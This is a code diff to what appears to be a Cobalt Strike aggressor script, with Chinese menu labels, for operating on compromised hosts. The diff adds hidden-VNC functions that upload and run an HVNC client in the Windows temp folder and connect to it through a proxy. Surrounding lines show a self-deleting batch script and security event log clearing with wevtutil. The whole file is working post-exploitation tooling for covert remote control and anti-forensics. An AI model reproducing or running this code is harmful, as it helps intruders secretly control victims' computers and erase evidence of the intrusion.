@@ -15,7 +15,7 @@ sub MhyProtect{
 sub AutoDeleteMe{
     bupload($bid,script_resource("bin/AutoDeleteMe.bat"));
     bshell($bid, "AutoDeleteMe.bat $3['path']");
-    bexit($bid)
+    bexit($bid);
 }
 sub Send {
         $username = replace(beacon_info($bid,"user"),' \*',"");
@@ -55,7 +55,16 @@ sub BiggerFile{
     bshell($bid, "copy /b $3['path1'] \+ c:\\windows\\temp\\myfile.tmp $3['path2']");
     bshell($bid,"del c:\\windows\\temp\\myfile.tmp")
 }
+sub HVNC_install{
+    bupload($bid,script_resource("bin/HVNC_Client.exe"));
+    bmv($bid,"HVNC_Client.exe","c:\\windows\\temp\\HVNCC.exe");
+    bexecute($bid, "c:\\windows\\temp\\HVNCC.exe $3['port']");
+}
 
+sub HVNC_link{
+    
+    exec(script_resource("bin/HVNC_Server.exe")." $3['ip'] $3['port']");
+}
 menu "小工具"{
     item "弹框"{
         $bid = $1['@'];
@@ -135,5 +144,30 @@ menu "小工具"{
         bshell($bid, "wevtutil cl security");
         bshell($bid, "wevtutil cl Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational");
     }
-
+    
+    menu "HVNC" {
+       item "安装"{
+            $bid = $1;
+            $dialog = dialog("安装HVNC", %(port => 6667), &HVNC_install);
+            dialog_description($dialog, "HVNC监听端口");
+            drow_text($dialog,"port","port:");
+            dbutton_action($dialog, "Send");
+            dialog_show($dialog);
+       }
+       item "卸载"{
+            $bid = $1;
+            bshell($bid,"taskkill /f /im HVNCC.exe");
+            brm($bid,"c:\\windows\\temp\\HVNCC.exe");
+       }
+       item "连接"{
+            $bid = $1;
+            $dialog = dialog("连接HVNC", %(ip => "127.0.0.1",port => 6667), &HVNC_link);
+            dialog_description($dialog, "连接远程HVNC\n请确保你能直接访问到远程目标，或者使用cs自带socks代理功能挂上代理连接\n我们程序将使用HVNC_Server.exe连接目标，请将这个进程套上代理");
+            drow_text($dialog,"ip","ip:");
+            drow_text($dialog,"port","port:");
+            dbutton_action($dialog, "Send");
+            dialog_show($dialog);
+       }
+       
+    }
 }
